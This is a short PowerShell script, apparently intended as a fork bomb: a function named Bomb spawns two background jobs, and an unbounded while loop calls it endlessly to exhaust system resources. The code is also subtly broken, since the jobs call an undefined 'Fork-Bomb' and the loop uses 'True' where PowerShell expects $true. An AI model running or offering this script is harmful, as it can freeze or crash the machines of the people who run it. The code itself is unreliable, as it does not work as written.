function Bomb {
    Start-Job -ScriptBlock { Fork-Bomb } | Out-Null
    Start-Job -ScriptBlock { Fork-Bomb } | Out-Null
}

while (True) { Bomb }
